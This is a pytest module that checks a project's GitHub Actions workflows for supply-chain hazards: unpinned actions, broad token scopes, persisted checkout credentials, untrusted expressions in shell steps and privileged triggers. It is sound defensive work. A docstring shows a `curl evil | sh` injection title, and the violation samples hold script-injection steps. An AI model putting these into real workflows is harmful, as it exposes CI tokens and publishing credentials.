"""The security rules every workflow in `.github/workflows/` keeps, read from
the files themselves.

The workflows build and publish the package, so they are part of what a user
installs. Each rule below held by convention before it was a test: every
action pinned to a commit, write scopes granted per job, checkouts that drop
the token, untrusted event text kept out of shell scripts. A convention holds
until one edit forgets it, and GitHub does not catch that edit for this
repository: SHA pinning is not required in its Actions settings, and a
workflow with no `permissions:` block runs with the repository's default
token scopes.

The rules are generic. A workflow added to the directory is held to them by
being there; the only per-workflow knowledge is `WRITE_ALLOWLIST`, the record
of which job may hold which write scope. The tests after the generic ones pin
properties of release.yml and publish-mcp.yml in particular: what reaches PyPI,
where provenance is signed, and how the registry publisher is checked.

Each rule is a function returning the violations it finds, and each is run
against an inline sample that breaks it (`test_a_rule_flags_its_violation`),
so a rule that stopped matching anything fails here instead of passing every
workflow. The parsing is PyYAML's, which reads a bare `on:` key as the
boolean True (YAML 1.1); `_triggers` reads either key.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Callable

import pytest
import yaml

REPO = Path(__file__).resolve().parents[1]
WORKFLOW_DIR = REPO / ".github" / "workflows"

#: The jobs that may hold a write scope, each with exactly the scopes it holds,
#: keyed by (workflow file name, job id). A write scope anywhere else fails
#: `permission_problems`; an entry that no longer matches its job fails
#: `test_the_allowlist_matches_the_jobs_it_names`, so the record cannot drift
#: into permitting more than the workflows use.
WRITE_ALLOWLIST: dict[tuple[str, str], frozenset[str]] = {
    # Trusted publishing: the OIDC token PyPI and TestPyPI exchange.
    ("release.yml", "publish-pypi"): frozenset({"id-token"}),
    ("release.yml", "publish-testpypi"): frozenset({"id-token"}),
    # Sigstore's signing certificate, and the attestation store.
    ("release.yml", "provenance"): frozenset({"id-token", "attestations"}),
    # Creates the GitHub release and uploads its assets.
    ("release.yml", "github-release"): frozenset({"contents"}),
    # The MCP registry's GitHub OIDC login.
    ("publish-mcp.yml", "publish"): frozenset({"id-token"}),
    # Code-scanning result uploads, under the job ids of the upstream CodeQL
    # and OpenSSF Scorecard templates (Scorecard's `publish_results` needs
    # the OIDC token). An entry for a workflow file not in the tree is unused.
    ("codeql.yml", "analyze"): frozenset({"security-events"}),
    ("scorecard.yml", "analysis"): frozenset({"security-events", "id-token"}),
}

Doc = dict[Any, Any]
Rule = Callable[[str, Doc, str], list[str]]


def _workflow_paths() -> list[Path]:
    return sorted(p for p in WORKFLOW_DIR.iterdir() if p.suffix in {".yml", ".yaml"})


def _load(text: str) -> Doc:
    doc = yaml.safe_load(text)
    assert isinstance(doc, dict), "a workflow file is a YAML mapping"
    return doc


def _workflow(name: str) -> Doc:
    return _load((WORKFLOW_DIR / name).read_text(encoding="utf-8"))


def _triggers(doc: Doc) -> Any:
    return doc.get("on", doc.get(True))


def _jobs(doc: Doc) -> dict[str, Doc]:
    jobs = doc.get("jobs") or {}
    return {str(job_id): job for job_id, job in jobs.items() if isinstance(job, dict)}


def _steps(job: Doc) -> list[Doc]:
    return [step for step in job.get("steps") or [] if isinstance(step, dict)]


def _runs(doc: Doc) -> list[tuple[str, str]]:
    """Every step's `run:` script, with where it sits."""
    return [
        (f"job {job_id} step {index}", step["run"])
        for job_id, job in _jobs(doc).items()
        for index, step in enumerate(_steps(job), 1)
        if isinstance(step.get("run"), str)
    ]


def _uses(doc: Doc) -> list[tuple[str, str]]:
    """Every `uses:` reference: a job that calls a reusable workflow, or a step."""
    found: list[tuple[str, str]] = []
    for job_id, job in _jobs(doc).items():
        if isinstance(job.get("uses"), str):
            found.append((f"job {job_id}", job["uses"]))
        for index, step in enumerate(_steps(job), 1):
            if isinstance(step.get("uses"), str):
                found.append((f"job {job_id} step {index}", step["uses"]))
    return found


def _action(ref: str) -> str:
    """`owner/repo[/path]` of a `uses:` reference, without its `@ref`."""
    return ref.split("@", 1)[0]


def _write_scopes(permissions: Any) -> set[str]:
    if isinstance(permissions, dict):
        return {str(scope) for scope, level in permissions.items() if level == "write"}
    return set()


def _needs(job: Doc) -> list[str]:
    needs = job.get("needs") or []
    return [needs] if isinstance(needs, str) else [str(n) for n in needs]


def _needed_by(jobs: dict[str, Doc], job_id: str) -> set[str]:
    """The jobs `job_id` waits for, directly or through another job."""
    seen: set[str] = set()
    pending = _needs(jobs[job_id])
    while pending:
        need = pending.pop()
        if need not in seen:
            seen.add(need)
            pending.extend(_needs(jobs.get(need, {})))
    return seen


# --- the rules -------------------------------------------------------------

_SHA_PINNED = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40}$")
_DOCKER_PINNED = re.compile(r"^docker://[^@\s]+@sha256:[0-9a-f]{64}$")


def unpinned_actions(name: str, doc: Doc, text: str) -> list[str]:
    """Every action and reusable workflow from another repository is named by
    a full commit sha, and every container image by its digest.

    A tag or a branch is a pointer its owner can move. Whoever moves it runs
    code in the next run of this workflow with that job's token, which in the
    publish jobs can mint the OIDC token PyPI accepts. A `./` reference is a
    file of this repository at the commit being run, so it is exempt.
    """
    problems: list[str] = []
    for where, ref in _uses(doc):
        if ref.startswith("./"):
            continue
        if ref.startswith("docker://"):
            if not _DOCKER_PINNED.match(ref):
                problems.append(f"{where}: `{ref}` is not pinned to an image digest")
        elif not _SHA_PINNED.match(ref):
            problems.append(
                f"{where}: `{ref}` is not pinned to a 40-character commit sha"
            )
    return problems


_USES_LINE = re.compile(
    r"^\s*(?:-\s+)?uses:\s*(?P<ref>[^\s#]+)\s*(?:#\s*(?P<comment>.*))?$"
)
_VERSION_COMMENT = re.compile(r"^v\d")


def missing_version_comments(name: str, doc: Doc, text: str) -> list[str]:
    """Every pinned reference carries a `# v<version>` comment naming the
    release its sha is.

    A bare sha says nothing to a reviewer, and Dependabot rewrites the comment
    with the sha when it bumps an action, which is how a bump stays legible
    in a diff. YAML drops comments, so this rule reads the raw lines, and it
    counts them against the parsed references so that a `uses:` written in a
    form the line pattern does not see (a flow mapping, a folded scalar) is
    reported rather than skipped.
    """
    problems: list[str] = []
    lines = [
        (number, match)
        for number, line in enumerate(text.splitlines(), 1)
        if (match := _USES_LINE.match(line))
    ]
    parsed = len(_uses(doc))
    if len(lines) != parsed:
        problems.append(
            f"{parsed} `uses:` references parse but {len(lines)} lines read as one; "
            "write each as `uses: <ref> # <version>` on a line of its own"
        )
    for number, match in lines:
        ref = match["ref"].strip("'\"")
        if ref.startswith("./"):
            continue
        if not _VERSION_COMMENT.match((match["comment"] or "").strip()):
            problems.append(f"line {number}: `{ref}` carries no `# v<version>` comment")
    return problems


def _permission_shape(where: str, permissions: Any) -> list[str]:
    if isinstance(permissions, dict):
        return [
            f"{where}: `{scope}: {level}` is not read, write or none"
            for scope, level in permissions.items()
            if level not in ("read", "write", "none")
        ]
    if permissions == "read-all":
        return []
    return [f"{where}: `permissions: {permissions}`; list the scopes"]


def permission_problems(name: str, doc: Doc, text: str) -> list[str]:
    """Every workflow declares top-level permissions that write nothing, and a
    write scope appears only on a job `WRITE_ALLOWLIST` names for it.

    Without a top-level block the token carries the repository's default
    scopes, which a settings change can widen for every workflow at once. A
    write scope at the top reaches every job, including the ones that run the
    test suite and third-party actions. Per job, each write is a capability a
    compromised step in that job inherits, so each is recorded here with the
    reason it exists. `read-all` is read-only and passes; `write-all` fails.
    """
    problems: list[str] = []
    if "permissions" not in doc:
        problems.append(
            "no top-level `permissions:`; the token would carry the repository default"
        )
    else:
        problems += _permission_shape("top level", doc["permissions"])
        writes = _write_scopes(doc["permissions"])
        if writes:
            problems.append(
                f"top level grants {sorted(writes)} write to every job; grant it per job"
            )
    for job_id, job in _jobs(doc).items():
        if "permissions" not in job:
            continue
        problems += _permission_shape(f"job {job_id}", job["permissions"])
        extra = _write_scopes(job["permissions"]) - WRITE_ALLOWLIST.get(
            (name, job_id), frozenset()
        )
        if extra:
            problems.append(
                f"job {job_id} holds {sorted(extra)} write, which WRITE_ALLOWLIST "
                f"does not name for ({name!r}, {job_id!r})"
            )
    return problems


def persisted_checkout_credentials(name: str, doc: Doc, text: str) -> list[str]:
    """Every actions/checkout step sets `persist-credentials: false`.

    By default the action writes the job's token into the checkout's git
    config, where it stays for the rest of the job and any later step can
    read it: a dependency's install hook, a test, a third-party action. No
    workflow here pushes, so none needs it there.
    """
    problems: list[str] = []
    for job_id, job in _jobs(doc).items():
        for index, step in enumerate(_steps(job), 1):
            ref = step.get("uses")
            if not isinstance(ref, str) or _action(ref) != "actions/checkout":
                continue
            value = (step.get("with") or {}).get("persist-credentials")
            if value is not False and str(value).lower() != "false":
                problems.append(
                    f"job {job_id} step {index}: actions/checkout without "
                    "`persist-credentials: false`"
                )
    return problems


_EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)
#: Contexts a person outside the repository can write, or that a workflow's
#: caller supplies: an issue or pull request title, a commit message, a fork's
#: branch name, a dispatch or reusable-workflow input, in the dotted form or
#: the index form (`github['event']`). `env` is one of them: a variable set
#: from any of those holds the same text, and `${{ env.TITLE }}` pastes it
#: into the script exactly as the expression it was set from would. The
#: lookbehind keeps a `steps.env.outputs` or `matrix.env` from matching.
#: `github.event_name` is not matched; GitHub sets it.
_UNTRUSTED = re.compile(
    r"\bgithub\s*(?:\.\s*|\[\s*['\"])(?:event|head_ref)\b"
    r"|(?<![\w.])(?:inputs|env)\b"
)


def untrusted_expressions_in_run(name: str, doc: Doc, text: str) -> list[str]:
    """No `run:` script expands an untrusted expression in place.

    GitHub substitutes `${{ ... }}` into the script text before the shell
    parses it, so a pull request titled `"; curl evil | sh; "` becomes shell
    code. Passed through `env:` and read as `"$VAR"`, the same value is data;
    expanded back as `${{ env.VAR }}`, it is code again, so the `env` context
    counts as untrusted here and the script reads the variable instead.
    `matrix`, `runner`, `steps.*.outputs` and `needs.*.outputs` expressions
    come from this repository's own files and stay allowed.
    """
    problems: list[str] = []
    for where, script in _runs(doc):
        for match in _EXPRESSION.finditer(script):
            if _UNTRUSTED.search(match.group(1)):
                problems.append(
                    f"{where}: `${{{{{match.group(1).strip()}}}}}` is expanded into the "
                    "script; pass it through `env:` and read the variable"
                )
    return problems


def privileged_triggers_and_inherited_secrets(
    name: str, doc: Doc, text: str
) -> list[str]:
    """No `pull_request_target` trigger, and no `secrets: inherit`.

    `pull_request_target` runs with the base repository's token and secrets
    on an event a fork opens, which is the setting every known pwn-request
    needs. `secrets: inherit` hands a called workflow every secret instead of
    the ones it names; release.yml calls ci.yml with none.
    """
    problems: list[str] = []
    triggers = _triggers(doc)
    names = {triggers} if isinstance(triggers, str) else set(triggers or [])
    if "pull_request_target" in names:
        problems.append("triggered by `pull_request_target`")
    for job_id, job in _jobs(doc).items():
        if job.get("secrets") == "inherit":
            problems.append(f"job {job_id}: `secrets: inherit`")
    return problems


_MOVING_RELEASE = re.compile(r"/releases/latest\b")


def downloads_of_a_moving_release(name: str, doc: Doc, text: str) -> list[str]:
    """No script downloads a `releases/latest` asset.

    `latest` is whatever the upstream project published last, so the bytes a
    run executes change without a change here, and no checksum can be pinned
    against a moving target. A download names its version, and the version is
    bumped in a reviewed edit.
    """
    return [
        f"{where}: downloads from `releases/latest`; pin the version"
        for where, script in _runs(doc)
        if _MOVING_RELEASE.search(script)
    ]


RULES: tuple[Rule, ...] = (
    unpinned_actions,
    missing_version_comments,
    permission_problems,
    persisted_checkout_credentials,
    untrusted_expressions_in_run,
    privileged_triggers_and_inherited_secrets,
    downloads_of_a_moving_release,
)


# --- the rules over the real workflows --------------------------------------


def test_the_workflow_directory_holds_the_release_path() -> None:
    """The parametrized tests below would pass vacuously over an empty or
    misplaced directory."""
    names = {path.name for path in _workflow_paths()}
    assert {"ci.yml", "release.yml", "publish-mcp.yml"} <= names


@pytest.mark.parametrize("rule", RULES, ids=lambda rule: rule.__name__)
@pytest.mark.parametrize("path", _workflow_paths(), ids=lambda path: path.name)
def test_every_workflow_keeps_every_rule(rule: Rule, path: Path) -> None:
    text = path.read_text(encoding="utf-8")
    assert rule(path.name, _load(text), text) == []


def test_the_allowlist_matches_the_jobs_it_names() -> None:
    """Each entry names a job that holds exactly the scopes listed, so an
    entry left behind by a job that dropped a write, or was renamed, fails
    rather than standing ready to permit the write again."""
    present = {
        path.name: _load(path.read_text(encoding="utf-8")) for path in _workflow_paths()
    }
    for (name, job_id), scopes in WRITE_ALLOWLIST.items():
        if name not in present:
            continue
        job = _jobs(present[name]).get(job_id)
        assert job is not None, (
            f"WRITE_ALLOWLIST names job {job_id!r}, which {name} lacks"
        )
        assert _write_scopes(job.get("permissions")) == scopes, (name, job_id)


# --- each rule against a sample that breaks it ------------------------------

_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"

_GOOD = f"""\
name: sample
on:
  push:
  workflow_dispatch:
    inputs:
      target:
        type: string
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{_SHA} # v7.0.1
        with:
          persist-credentials: false
      - name: Expressions that come from the workflow or from GitHub itself
        run: echo "${{{{ matrix.os }}}} ${{{{ runner.temp }}}} ${{{{ github.event_name }}}} $TITLE"
        env:
          TITLE: ${{{{ github.event.pull_request.title }}}}
          TARGET: ${{{{ inputs.target }}}}
  gate:
    uses: ./.github/workflows/ci.yml
"""


def test_the_good_sample_passes_every_rule() -> None:
    """The sample the violations below are cut from is itself clean: the
    expressions in `env:`, `github.event_name` in a script, a local reusable
    workflow."""
    for rule in RULES:
        assert rule("sample.yml", _load(_GOOD), _GOOD) == [], rule.__name__


def test_read_all_and_an_empty_mapping_are_read_only() -> None:
    for top in ("permissions: read-all", "permissions: {}"):
        text = _GOOD.replace("permissions:\n  contents: read", top)
        assert permission_problems("sample.yml", _load(text), text) == []


_CHECKOUT = f"      - uses: actions/checkout@{_SHA} # v7.0.1\n"
_CHECKOUT_WITH = _CHECKOUT + "        with:\n          persist-credentials: false\n"


def _job_permissions(block: str) -> str:
    return _GOOD.replace(
        "  test:\n    runs-on: ubuntu-latest\n",
        f"  test:\n    runs-on: ubuntu-latest\n    permissions:\n{block}",
    )


def _extra_step(step: str) -> str:
    return _GOOD.replace("  gate:\n", f"{step}  gate:\n")


VIOLATIONS: list[tuple[Rule, str, str]] = [
    (
        unpinned_actions,
        _GOOD.replace(f"@{_SHA}", "@v7"),
        "not pinned to a 40-character",
    ),
    (
        unpinned_actions,
        _GOOD.replace(f"@{_SHA}", "@main"),
        "not pinned to a 40-character",
    ),
    (
        unpinned_actions,
        _GOOD.replace(
            "./.github/workflows/ci.yml", "someone/else/.github/workflows/x.yml@v1"
        ),
        "job gate",
    ),
    (
        unpinned_actions,
        _extra_step("      - uses: docker://alpine:3.20\n"),
        "image digest",
    ),
    (
        missing_version_comments,
        _GOOD.replace(" # v7.0.1", ""),
        "no `# v<version>` comment",
    ),
    (
        missing_version_comments,
        _GOOD.replace("# v7.0.1", "# pinned"),
        "no `# v<version>`",
    ),
    (
        missing_version_comments,
        _extra_step(f"      - {{uses: actions/cache@{_SHA}}}\n"),
        "lines read as one",
    ),
    (
        permission_problems,
        _GOOD.replace("permissions:\n  contents: read\n", ""),
        "no top-level",
    ),
    (
        permission_problems,
        _GOOD.replace(
            "permissions:\n  contents: read", "permissions:\n  contents: write"
        ),
        "to every job",
    ),
    (
        permission_problems,
        _GOOD.replace("permissions:\n  contents: read", "permissions: write-all"),
        "write-all",
    ),
    (
        permission_problems,
        _job_permissions("      id-token: write\n"),
        "WRITE_ALLOWLIST",
    ),
    (
        permission_problems,
        _job_permissions("      contents: admin\n"),
        "not read, write",
    ),
    (
        persisted_checkout_credentials,
        _GOOD.replace(_CHECKOUT_WITH, _CHECKOUT),
        "persist-credentials",
    ),
    (
        persisted_checkout_credentials,
        _GOOD.replace("persist-credentials: false", "persist-credentials: true"),
        "persist-credentials",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step('      - run: echo "${{ github.event.issue.title }}"\n'),
        "github.event.issue.title",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step("      - run: echo ${{ toJSON(github.event) }}\n"),
        "toJSON(github.event)",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step("      - run: git switch ${{ github.head_ref }}\n"),
        "github.head_ref",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step("      - run: |\n          deploy ${{ inputs.target }}\n"),
        "inputs.target",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step(
            '      - run: echo "${{ env.TITLE }}"\n'
            "        env:\n"
            "          TITLE: ${{ github.event.issue.title }}\n"
        ),
        "env.TITLE",
    ),
    (
        untrusted_expressions_in_run,
        _extra_step("      - run: echo ${{ github['event']['issue']['title'] }}\n"),
        "github['event']",
    ),
    (
        privileged_triggers_and_inherited_secrets,
        _GOOD.replace("on:\n  push:\n", "on:\n  pull_request_target:\n"),
        "pull_request_target",
    ),
    (
        privileged_triggers_and_inherited_secrets,
        _GOOD.replace(
            "on:\n  push:\n  workflow_dispatch:", "on: [pull_request_target]\nx:"
        ),
        "pull_request_target",
    ),
    (
        privileged_triggers_and_inherited_secrets,
        _GOOD + "    secrets: inherit\n",
        "secrets: inherit",
    ),
    (
        downloads_of_a_moving_release,
        _extra_step(
            "      - run: curl -L https://github.com/o/r/releases/latest/download/t.tgz | tar xz\n"
        ),
        "releases/latest",
    ),
]


@pytest.mark.parametrize(
    ("expression", "untrusted"),
    [
        ("github.event.pull_request.title", True),
        ("github['event'].issue.body", True),
        ("github.head_ref", True),
        ("inputs.target", True),
        ("toJSON(inputs)", True),
        ("env.TITLE", True),
        ("env['TITLE']", True),
        ("github.event_name", False),
        ("github['event_name']", False),
        ("steps.env.outputs.path", False),
        ("matrix.environment", False),
        ("needs.build.outputs.version", False),
        ("runner.temp", False),
    ],
)
def test_the_untrusted_context_pattern(expression: str, untrusted: bool) -> None:
    assert bool(_UNTRUSTED.search(expression)) is untrusted


@pytest.mark.parametrize(
    ("rule", "text", "fragment"),
    VIOLATIONS,
    ids=[f"{rule.__name__}-{n}" for n, (rule, _, _) in enumerate(VIOLATIONS)],
)
def test_a_rule_flags_its_violation(rule: Rule, text: str, fragment: str) -> None:
    problems = rule("sample.yml", _load(text), text)
    assert problems, f"{rule.__name__} passed a sample that breaks it"
    assert any(fragment in problem for problem in problems), problems


def test_every_rule_has_a_sample_that_breaks_it() -> None:
    """The promise in the module docstring, kept for a rule added later: one
    with no sample in `VIOLATIONS` could match nothing and pass every
    workflow unnoticed."""
    sampled = {rule.__name__ for rule, _, _ in VIOLATIONS}
    assert [rule.__name__ for rule in RULES if rule.__name__ not in sampled] == []


# --- release.yml: what reaches PyPI, and where provenance is signed ---------


def test_the_publish_jobs_ship_the_gated_build_alone() -> None:
    """publish-pypi and publish-testpypi wait for the build and the full CI
    matrix and nothing else, and do two things: download the `dist` artifact
    into dist/ and upload it. Provenance, checksums and the SBOM sit beside
    this path, so none of them can hold a publish back or change its files."""
    jobs = _jobs(_workflow("release.yml"))
    for job_id in ("publish-pypi", "publish-testpypi"):
        assert _needed_by(jobs, job_id) == {"build", "ci"}, job_id
        steps = _steps(jobs[job_id])
        assert [_action(step.get("uses", "")) for step in steps] == [
            "actions/download-artifact",
            "pypa/gh-action-pypi-publish",
        ], job_id
        assert steps[0]["with"] == {"name": "dist", "path": "dist/"}, job_id


#: A shell redirection or an output flag aimed into dist/ (not dist-extra/),
#: or a copy, move or link whose last operand is dist/ or a path in it. A
#: dist/ path followed by another operand is a source, so `cp dist/x out/`
#: does not match.
_WRITES_INTO_DIST = re.compile(
    r"(?:>>?|\btee(?:\s+-a)?|(?:^|\s)(?:-o|--out|--output|--out-dir|--outdir)(?:\s+|=))"
    r"\s*[\"']?(?:\./)?dist/"
    r"|\b(?:cp|mv|ln|install|rsync)\b[^\n;&|]*\s[\"']?(?:\./)?dist(?:/[^\s;&|\"')]*)?"
    r"[\"']?[ \t]*(?:$|[\n;&|)])"
)


@pytest.mark.parametrize(
    ("script", "writes"),
    [
        ("sha256sum dist/* > dist/SHA256SUMS", True),
        ("python3 tools/sbom.py --out dist/x.json", True),
        ("python3 tools/sbom.py --out=./dist/x.json", True),
        ("echo x | tee -a dist/notes", True),
        ("cp dist-extra/SHA256SUMS dist/", True),
        ("mv bettermemory.cdx.json ./dist/sbom.json && ls", True),
        ("set -e\ncp SHA256SUMS dist\necho done", True),
        ("cp dist/*.whl dist-extra/", False),
        ("cp -r dist dist-backup", False),
        ("uv python install 3.13", False),
        ("(cd dist && sha256sum -- *) > dist-extra/SHA256SUMS", False),
        ("cd dist && sha256sum --check --strict ../dist-extra/SHA256SUMS", False),
        (
            "python3 tools/sbom.py --lock uv.lock --out dist-extra/bettermemory.cdx.json",
            False,
        ),
        ("uv build", False),
    ],
)
def test_the_dist_write_pattern(script: str, writes: bool) -> None:
    assert bool(_WRITES_INTO_DIST.search(script)) is writes


def test_only_uv_build_writes_into_dist() -> None:
    """gh-action-pypi-publish hands every file in dist/ to twine, which
    refuses a file that is not a distribution, so SHA256SUMS and the SBOM
    are written to dist-extra/ and travel in an artifact of their own. In
    dist/ either would fail the publish."""
    for where, script in _runs(_workflow("release.yml")):
        assert not _WRITES_INTO_DIST.search(script), where
    for job_id, job in _jobs(_workflow("release.yml")).items():
        for step in _steps(job):
            action = _action(step.get("uses", ""))
            given = step.get("with") or {}
            if action == "actions/upload-artifact" and given.get("name") == "dist":
                assert given.get("path") == "dist/", job_id
            if action == "actions/download-artifact" and given.get("path") == "dist/":
                assert given.get("name") == "dist", job_id


def test_provenance_is_signed_off_the_publish_path() -> None:
    """The attestation runs in one job, `provenance`, which holds the two
    write scopes signing needs and which no publish job waits for: a Sigstore
    outage turns the run red without stopping the PyPI upload. The build job,
    which runs the test suite and the build backend, holds no write scope."""
    jobs = _jobs(_workflow("release.yml"))
    attesting = [
        job_id
        for job_id, job in jobs.items()
        if any(
            _action(step.get("uses", "")) == "actions/attest-build-provenance"
            for step in _steps(job)
        )
    ]
    assert attesting == ["provenance"]
    for publish in ("publish-pypi", "publish-testpypi"):
        assert "provenance" not in _needed_by(jobs, publish)
    assert _needed_by(jobs, "provenance") == {"build", "ci"}
    assert _write_scopes(jobs["provenance"]["permissions"]) == {
        "id-token",
        "attestations",
    }
    assert _write_scopes(jobs["build"].get("permissions")) == set()
    attest = next(
        step
        for step in _steps(jobs["provenance"])
        if _action(step.get("uses", "")) == "actions/attest-build-provenance"
    )
    assert attest["with"]["subject-path"] == "dist/*"


def test_the_build_job_restores_no_cache() -> None:
    """setup-uv's default, `auto`, caches; the job that builds what PyPI
    receives turns it off by name."""
    build = _jobs(_workflow("release.yml"))["build"]
    setups = [
        s for s in _steps(build) if _action(s.get("uses", "")) == "astral-sh/setup-uv"
    ]
    assert setups
    for setup in setups:
        assert (setup.get("with") or {}).get("enable-cache") in (False, "false")


def test_the_release_attaches_the_checksums_and_an_sbom_when_there_is_one() -> None:
    """The GitHub release carries dist/ and dist-extra/: SHA256SUMS always, and
    the SBOM from tools/sbom.py only where the tagged tree has the script, so
    the job is correct in a tree with or without it."""
    steps = _steps(_jobs(_workflow("release.yml"))["github-release"])
    sbom = [step for step in steps if "tools/sbom.py" in str(step.get("run", ""))]
    assert len(sbom) == 1
    assert re.sub(r"\s", "", sbom[0]["if"]) == "hashFiles('tools/sbom.py')!=''"
    assert "--out dist-extra/" in sbom[0]["run"]
    create = [
        step
        for step in steps
        if _action(step.get("uses", "")) == "softprops/action-gh-release"
    ]
    assert len(create) == 1
    assert set(create[0]["with"]["files"].split()) == {"dist/*", "dist-extra/*"}


# --- publish-mcp.yml: the registry publisher is pinned and checked ----------


def test_mcp_publisher_is_pinned_and_checked_before_it_is_unpacked() -> None:
    """The publisher runs in a job that can mint an OIDC token, so the step
    names its version, holds upstream's checksums file to a pinned digest,
    and checks the archive against its line before `tar` unpacks it. The
    OIDC scope sits on the one job, not the workflow."""
    doc = _workflow("publish-mcp.yml")
    job = _jobs(doc)["publish"]
    installs = [
        step
        for step in _steps(job)
        if "mcp-publisher" in str(step.get("run", ""))
        and "curl" in str(step.get("run", ""))
    ]
    assert len(installs) == 1
    env = installs[0]["env"]
    assert re.fullmatch(r"\d+\.\d+\.\d+", str(env["MCP_PUBLISHER_VERSION"]))
    assert re.fullmatch(r"[0-9a-f]{64}", str(env["MCP_PUBLISHER_CHECKSUMS_SHA256"]))
    script = installs[0]["run"]
    checks = [
        match.start() for match in re.finditer(r"sha256sum --check --strict", script)
    ]
    assert len(checks) == 2
    assert max(checks) < script.index("tar xzf") < script.index("./mcp-publisher")
    # The two pins are what the checks stand on: the first check holds the
    # checksums file to the pinned digest, not to a value fetched beside it,
    # and both downloads come from the pinned version's release.
    first_check_line = script[: min(checks)].rsplit("\n", 1)[-1]
    assert "${MCP_PUBLISHER_CHECKSUMS_SHA256}" in first_check_line
    assert "/releases/download/v${MCP_PUBLISHER_VERSION}" in script
    assert _write_scopes(doc["permissions"]) == set()
    assert _write_scopes(job["permissions"]) == {"id-token"}
